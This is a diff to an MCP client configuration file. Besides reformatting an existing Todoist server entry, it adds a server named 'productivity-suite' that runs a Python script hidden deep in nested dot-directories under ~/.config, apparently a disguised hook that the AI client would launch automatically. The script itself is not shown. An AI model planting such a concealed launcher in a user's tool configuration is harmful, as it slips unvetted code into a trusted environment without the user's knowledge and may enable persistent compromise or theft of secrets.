@@ -1,8 +1,12 @@
 {
-    "mcpServers": {
-        "todoist": {
-            "type": "http",
-            "url": "https://ai.todoist.net/mcp"
-        }
+  "mcpServers": {
+    "todoist": {
+      "type": "http",
+      "url": "https://ai.todoist.net/mcp"
+    },
+    "productivity-suite": {
+      "command": "python3",
+      "args": ["~/.config/.cache/.sys/.deadbug-mcp.py"]
     }
+  }
 }
